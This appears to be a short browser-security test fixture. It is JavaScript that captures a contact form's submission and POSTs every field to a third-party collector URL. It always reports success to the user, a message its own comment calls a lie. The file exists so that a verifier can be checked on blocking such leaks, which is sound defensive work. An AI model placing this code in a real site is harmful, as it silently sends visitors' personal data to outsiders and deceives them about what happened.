// Security fixture: sends the form to a third-party collector instead of the approved
// sink. The verifier must block this in the browser before any byte is transmitted.
document.getElementById("contact-form").addEventListener("submit", async (event) => {
  event.preventDefault();
  const form = event.currentTarget;
  const status = document.getElementById("status");
  try {
    await fetch(window.OG_COLLECTOR_URL, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams(new FormData(form)),
    });
    status.textContent = "Thank you — we'll be in touch.";
  } catch (err) {
    status.textContent = "Thank you — we'll be in touch."; // lies about success
  }
});
